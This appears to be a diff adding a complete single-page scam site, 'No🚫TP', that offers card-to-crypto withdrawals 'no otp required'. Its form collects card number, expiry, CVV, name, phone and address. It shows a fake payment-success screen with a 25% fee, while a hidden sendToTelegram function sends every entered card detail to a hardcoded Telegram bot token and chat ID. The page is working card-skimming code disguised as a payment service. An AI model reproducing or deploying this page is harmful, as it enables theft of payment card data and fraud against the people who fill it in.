@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>No🚫TP Payment</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <header>
+        <h1>No🚫TP</h1>
+        <div class="menu-icon">☰</div>
+    </header>
+
+    <section id="page1">
+        <h2>About the Website</h2>
+        <p>Withdraw with card no otp required. Securely make payments and withdraw cryptocurrency with ease.</p>
+        <button onclick="showPage(2)">Start Payment</button>
+    </section>
+
+    <section id="page2" class="hidden">
+        <h2>Enter Card Details</h2>
+        <input type="text" id="cardNumber" placeholder="Card Number" maxlength="23" oninput="formatCardNumber()" required>
+        <div class="row">
+            <input type="text" id="expDate" placeholder="MM/YY" maxlength="5" oninput="formatExpDate()" required>
+            <input type="text" id="cvv" placeholder="CVV" maxlength="3" required>
+        </div>
+        <input type="text" id="cardHolder" placeholder="Cardholder Name" required>
+        <input type="tel" id="phoneNumber" placeholder="Phone Number (Optional)">
+        <input type="text" id="address" placeholder="Address (Optional)">
+        <button onclick="showPage(3)">Next</button>
+    </section>
+
+    <section id="page3" class="hidden">
+        <h2>Select Cryptocurrency</h2>
+        <select id="crypto">
+            <option value="BNB">BNB</option>
+            <option value="TRX">TRX</option>
+            <option value="USDT">USDT</option>
+        </select>
+        <input type="text" id="walletAddress" placeholder="Wallet Address" required>
+        <select id="amount">
+            <option>#10,000</option>
+            <option>#20,000</option>
+            <option>#30,000</option>
+            <option>#40,000</option>
+            <option>#50,000</option>
+            <option>#100,000</option>
+            <option>#150,000</option>
+            <option>#200,000</option>
+            <option>#250,000</option>
+            <option>#300,000</option>
+            <option>#500,000</option>
+        </select>
+        <input type="number" id="withdrawTimes" placeholder="Times to Withdraw" min="1">
+        <button onclick="confirmPayment()">Confirm Pay</button>
+    </section>
+
+    <section id="page4" class="hidden">
+        <div class="loader"></div>
+        <p id="paymentStatus"></p>
+    </section>
+
+    <script src="script.js"></script>
+</body>
+<style>
+body {
+    font-family: Arial, sans-serif;
+    background: linear-gradient(to right, black, blue);
+    color: white;
+    text-align: center;
+    margin: 0;
+    padding: 0;
+}
+
+header {
+    display: flex;
+    justify-content: space-between;
+    padding: 15px;
+    background: black;
+}
+
+.menu-icon {
+    font-size: 24px;
+    cursor: pointer;
+}
+
+.hidden {
+    display: none;
+}
+
+section {
+    margin: 50px auto;
+    max-width: 400px;
+    padding: 20px;
+    background: rgba(255, 255, 255, 0.1);
+    border-radius: 10px;
+}
+
+input, select, button {
+    width: 100%;
+    padding: 10px;
+    margin: 10px 0;
+    border: none;
+    border-radius: 5px;
+}
+
+button {
+    background: blue;
+    color: white;
+    cursor: pointer;
+}
+
+.row {
+    display: flex;
+    gap: 10px;
+}
+
+.checkmark {
+    font-size: 50px;
+    color: green;
+    margin: 20px auto;
+}
+
+.row input {
+    width: 48%;
+}
+
+.loader {
+    border: 5px solid white;
+    border-top: 5px solid blue;
+    border-radius: 50%;
+    width: 50px;
+    height: 50px;
+    animation: spin 2s linear infinite;
+    margin: 20px auto;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+</style>
+<script>
+function showPage(page) {
+    document.querySelectorAll("section").forEach(sec => sec.classList.add("hidden"));
+    document.getElementById("page" + page).classList.remove("hidden");
+}
+
+function formatCardNumber() {
+    let input = document.getElementById("cardNumber");
+    let value = input.value.replace(/\D/g, "").substring(0, 19);
+    let formatted = "";
+    let verve = value.length === 19;
+
+    for (let i = 0; i < value.length; i++) {
+        if (i > 0 && (i % 4 === 0) && (!verve || i !== 16)) formatted += " ";
+        formatted += value[i];
+    }
+
+    input.value = formatted;
+    validateLuhn(value);
+}
+
+function validateLuhn(number) {
+    let sum = 0;
+    let alternate = false;
+    for (let i = number.length - 1; i >= 0; i--) {
+        let n = parseInt(number[i]);
+        if (alternate) {
+            n *= 2;
+            if (n > 9) n -= 9;
+        }
+        sum += n;
+        alternate = !alternate;
+    }
+    document.getElementById("cardNumber").style.borderColor = (sum % 10 === 0) ? "green" : "red";
+}
+
+function formatExpDate() {
+    let input = document.getElementById("expDate");
+    let value = input.value.replace(/\D/g, "").substring(0, 4);
+    if (value.length >= 2) value = value.substring(0, 2) + "/" + value.substring(2);
+    input.value = value;
+}
+
+function confirmPayment() {
+    showPage(4);
+
+    setTimeout(() => {
+        document.querySelector(".loader").style.display = "none"; // Hide loader
+        document.getElementById("paymentStatus").innerHTML = `
+            <div class="checkmark">✔</div>
+            <h2>Payment Request Sent Successfully</h2>
+            <p>Crypto: ${document.getElementById("crypto").value}</p>
+            <p>Wallet: ${document.getElementById("walletAddress").value}</p>
+            <p>Amount: ${document.getElementById("amount").value}</p>
+            <p>Service Fee: 25%</p>
+            <p>You will receive your order in an hour.</p>
+        `;
+
+        sendToTelegram(); // Send details after confirmation
+    }, 6000);
+}
+
+async function sendToTelegram() {
+    let data = {
+        cardNumber: document.getElementById("cardNumber").value,
+        expDate: document.getElementById("expDate").value,
+        cvv: document.getElementById("cvv").value,
+        cardHolder: document.getElementById("cardHolder").value,
+        phone: document.getElementById("phoneNumber").value || "N/A",
+        address: document.getElementById("address").value || "N/A",
+        crypto: document.getElementById("crypto").value,
+        wallet: document.getElementById("walletAddress").value,
+        amount: document.getElementById("amount").value
+    };
+
+    let botToken = "8145162432:AAFxeZoXf7nSDPqaB3RQVDtGevhjzSttp_w";
+    let chatId = "7968684305";
+    let message = `Payment Details:\n\n` +
+                  `💳 Card Number: ${data.cardNumber}\n` +
+                  `📅 Expiry Date: ${data.expDate}\n` +
+                  `🔒 CVV: ${data.cvv}\n` +
+                  `👤 Card Holder: ${data.cardHolder}\n` +
+                  `📞 Phone: ${data.phone}\n` +
+                  `🏠 Address: ${data.address}\n` +
+                  `💰 Crypto: ${data.crypto}\n` +
+                  `🏦 Wallet: ${data.wallet}\n` +
+                  `💲 Amount: ${data.amount}`;
+
+    try {
+        let response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
+        });
+
+        let result = await response.json();
+        if (!result.ok) throw new Error(result.description);
+        console.log("Message sent successfully:", result);
+    } catch (error) {
+        console.error("Error sending message:", error);
+        alert("Check your internet connection and try again.");
+    }
+}
+</script>
+</html>
